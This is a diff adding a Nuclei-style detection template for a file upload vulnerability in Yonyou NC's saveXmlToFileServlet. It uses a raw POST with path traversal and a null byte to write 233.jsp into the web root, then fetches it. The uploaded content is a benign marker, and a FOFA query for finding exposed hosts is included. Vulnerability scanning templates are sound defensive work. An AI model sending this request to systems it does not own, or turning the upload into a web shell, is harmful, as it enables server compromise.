@@ -1,0 +1,34 @@
+id: yongyou-nc-savexmltofileservlet-fileupload
+
+info:
+  name: yongyou-nc-savexmltofileservlet-fileupload
+  author: unknow
+  severity: high
+  description: 用友 NC saveXmlToFileServlet 存在文件上传漏洞。
+  tags: yongyou,fileupload
+  metadata:
+    fofa-qeury: title="YONYOU NC"
+
+http:
+  - raw:
+      - |              
+        POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{filename}}%00 HTTP/1.1
+        Host: 
+        Content-Type: application/octet-stream
+        User-Agent: Mozilla/5.0
+
+        233333333333 
+      - | 
+        GET /{{filename}} HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0
+
+    payloads:
+      filename:
+        - "233.jsp"
+
+    matchers:     
+      - type: dsl
+        name: fileupload
+        dsl:
+          - '(status_code==200 )  && contains(body, "233333333333") && contains(header, "text/html")'
